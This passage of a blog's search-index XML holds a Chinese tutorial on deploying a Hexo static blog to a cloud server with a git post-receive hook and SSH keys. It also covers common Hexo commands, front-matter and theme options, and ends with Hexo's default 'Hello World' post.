plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">git --work-tree=/usr/local/hexo --git-dir=/usr/local/hexoRepo/hexo.git checkout -f</span><br></pre></td></tr></table></figure><p>3.5. 保存并退出后, 给该文件添加可执行权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/hexoRepo/hexo.git/hooks/post-receive</span><br></pre></td></tr></table></figure></li><li><p>本地博客推送到云服务器</p><p>4.1. 安装<code>hexo-deployer-git</code>插件。在命令行（即Git Bash）运行以下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>4.2. 添加SSH key。</p><ul><li><p>创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure></li><li><p>添加到 github。 复制密钥文件内容（路径形如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fsettings%2Fkeys" target="_blank" rel="noopener">New SSH Key</a>即可。</p></li><li><p>测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">$ yes</span><br></pre></td></tr></table></figure></li></ul><p>4.3. 修改<code>_config.yml</code>（在站点目录下）。文件末尾修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: root@xxx.xxx.xxx.xxx:/usr/local/hexoRepo/hexo  //用户名@域名或 IP 地址:/usr/local/hexoRepo/hexo</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>注意：上面仓库地址写ssh地址，不写http地址。</p><p>4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回<code>INFO Deploy done: git</code>即成功推送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></li><li><p>等待1分钟左右，浏览器访问个人域名。</p><p>至此，您的Hexo博客已经搭建在云服务器, 域名为个人域名。</p></li></ol><h2 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a>Hexo常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hexo new "postName" #新建文章</span><br><span class="line">hexo new page "pageName" #新建页面</span><br><span class="line">hexo clean #清除部署緩存</span><br><span class="line">hexo n == hexo new #新建文章</span><br><span class="line">hexo g == hexo generate #生成静态页面至public目录</span><br><span class="line">hexo s == hexo server #开启预览访问端口（默认端口4000，可在浏览器输入localhost:4000预览）</span><br><span class="line">hexo d == hexo deploy #将.deploy目录部署到GitHub</span><br><span class="line">hexo g -d #生成加部署</span><br><span class="line">hexo g -s #生成加预览</span><br></pre></td></tr></table></figure><p><strong>注：</strong>当本地预览和远程部署的浏览结果不同的时候，不妨使用<code>hexo clean &amp;&amp; hexo g -d</code>试试。</p><h4 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h4><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>[layout]可以为以下三种：</li></ul><table><thead><tr><th>参数名</th><th>功能</th><th>文章路径</th></tr></thead><tbody><tr><td>post</td><td>新建博文</td><td>source/_posts</td></tr><tr><td>page</td><td>新建页面（如404，分类）</td><td>source</td></tr><tr><td>draft</td><td>草稿</td><td>source/_drafts</td></tr></tbody></table><p>草稿可通过一下命令发布：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;title&gt;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li><p>title注意：</p><p>不是博文标题，</p><p>是博文markdown文件的名字，</p><p>也是博文链接的后缀（如<code>https://www.simon96.online/2018/10/12/hexo-tutorial/</code>中的hexo-tutorial）</p></li></ul><h4 id="文章模版"><a href="#文章模版" class="headerlink" title="文章模版"></a>文章模版</h4><ul><li><p>创建模版</p><p>在新建文章时，Hexo 会根据 <code>scaffolds</code> 文件夹内相对应的文件来建立文件，例如：</p></li></ul><blockquote><p>$ hexo new blog “simon”</p></blockquote><p>​    在执行这行指令时，Hexo 会尝试在 <code>scaffolds</code> 文件夹中寻找 <code>blog.md</code>，并根据其内容建立文章。</p><ul><li><p>修改参数</p><p>以下是您可以在模版中使用的变量：</p></li></ul><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>layout</td><td>布局</td></tr><tr><td>title</td><td>标题</td></tr><tr><td>date</td><td>文件建立日期</td></tr></tbody></table><h4 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a>Front-matter</h4><p>就是博文最上方以 <code>---</code> 分隔的那部分。</p><p>默认可以使用的Front-matter：</p><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td><td></td></tr><tr><td><code>title</code></td><td>标题</td><td></td></tr><tr><td><code>date</code></td><td>建立日期</td><td>文件建立日期</td></tr><tr><td><code>updated</code></td><td>更新日期</td><td>文件更新日期</td></tr><tr><td><code>comments</code></td><td>开启文章的评论功能</td><td>true</td></tr><tr><td><code>tags</code></td><td>标签（不适用于分页）</td><td></td></tr><tr><td><code>categories</code></td><td>分类（不适用于分页）</td><td></td></tr><tr><td><code>permalink</code></td><td>覆盖文章网址</td></tr></tbody></table><h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p><a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">hexo主题wiki</a></p><p>可以在<a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">此处</a>寻找自己喜欢的主题下载所有的主题文件，保存到Hexo目录下的<code>themes</code>文件夹下。然后在<code>_config.yml</code>文件中修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: http://hexo.io/plugins/</span><br><span class="line">## Themes: http://hexo.io/themes/</span><br><span class="line">theme: landscape //themes文件夹中对应文件夹的名称</span><br></pre></td></tr></table></figure><p>然后先执行<code>hexo clean</code>，然后重新<code>hexo g</code>，并且<code>hexo d</code>，很快就能看到新主题的效果了~</p><h2 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h2><ul><li><p><strong>设置「RSS」</strong></p></li><li><p><strong>添加「标签」页面</strong></p></li><li><p><strong>添加「分类」页面</strong></p></li><li><p><strong>设置「字体」</strong></p></li><li><p><strong>设置「代码高亮主题」</strong></p></li><li><p><strong>侧边栏社交链接</strong></p><p>问题：图标哪里找？</p><p>解决：<a href="https://link.juejin.im?target=https%3A%2F%2Ffontawesome.com%2Ficons%3Fd%3Dgallery" target="_blank" rel="noopener">Font Awesome</a></p></li><li><p><strong>开启打赏功能</strong></p><p>问题：微信支付宝二维码不美观，规格不一。</p><p>解决：<a href="https://link.juejin.im?target=https%3A%2F%2Fcli.im%2Fweixin" target="_blank" rel="noopener">在线生成二维码</a></p></li><li><p><strong>设置友情链接</strong></p></li><li><p><strong>添加个人联系方式</strong></p></li><li><p><strong>腾讯公益404页面</strong></p></li><li><p><strong>站点建立时间</strong></p></li><li><p><strong>订阅微信公众号</strong></p></li><li><p><strong>设置「动画效果」</strong></p><p>问题：慢，需要等待 JavaScript 脚本完全加载完毕后才会显示内容。 解决：将主题配置文件<code>_config.yml</code>中，use_motion字段的值设为 <code>false</code> 来关闭动画。</p></li><li><p><strong>设置「背景动画」</strong></p></li><li><p><strong>添加背景图</strong></p></li><li><p><strong>修改Logo字体</strong></p></li><li><p><strong>修改内容区域的宽度</strong></p></li><li><p><strong>网站标题栏背景颜色</strong></p></li><li><p><strong>自定义鼠标样式</strong></p></li><li><p><strong>文章加密访问</strong></p></li><li><p><strong>实现点击出现桃心效果</strong></p></li><li><p><strong>静态资源压缩（博文压缩）</strong></p></li><li><p><strong>修改访问url路径</strong></p></li><li><p><strong>博文置顶</strong></p></li><li><p><strong>在右上角或左上角实现fork me on github</strong></p></li><li><p><strong>主页文章添加边框阴影效果</strong></p></li><li><p><strong>显示当前浏览记录</strong></p></li><li><p><strong>常见分类页</strong></p></li><li><p><strong>加入广告</strong></p></li><li><p><strong>添加萌萌哒</strong></p></li><li><p><strong>搜索功能</strong></p></li><li><p><strong>网易云外链播放器</strong></p></li><li><p><strong><a href="http://www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/" target="_blank" rel="noopener">花里胡哨的玩意儿</a></strong></p></li><li><p><strong>修改作者头像并旋转</strong></p></li><li><p><strong>修改<code></code>代码块自定义样式</strong></p></li><li><p><strong>点击爆炸效果</strong></p></li><li><p><strong>添加萌妹子动图</strong></p></li><li><p><strong>侧栏设置</strong></p></li><li><p><strong>透明背景设置</strong></p></li><li><p><strong>添加阅读全文</strong></p></li><li><p><strong>设置网站缩略图标</strong></p></li><li><p><strong>添加站点访问计数</strong></p></li></ul><p>前几个可参考<a href="http://theme-next.iissnan.com/theme-settings.html#use-bg-animation" target="_blank" rel="noopener">next官方文档配置</a></p><p>（以下用到外部工具）</p><p>评论系统</p><p>数据统计与分析</p><p>内容分享服务</p><p><a href="https://www.jianshu.com/p/44e211829447" target="_blank" rel="noopener">文章加密访问</a></p><p><a href="https://github.com/MikeCoder/hexo-blog-encrypt" target="_blank" rel="noopener">hexo-blog-encrypt</a></p><h2 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a>SEO</h2><p><a href="https://www.jianshu.com/p/0d54a590b81a" target="_blank" rel="noopener">Hexo NexT 主题SEO优化指南</a></p><p>seo这东西是使自己的文章能被百度、谷歌搜录，能被搜索到。</p><p>因为暂时不想被搜到/doge，所有暂不配置</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/05/13/hello-world/"/>
      <url>/2019/05/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
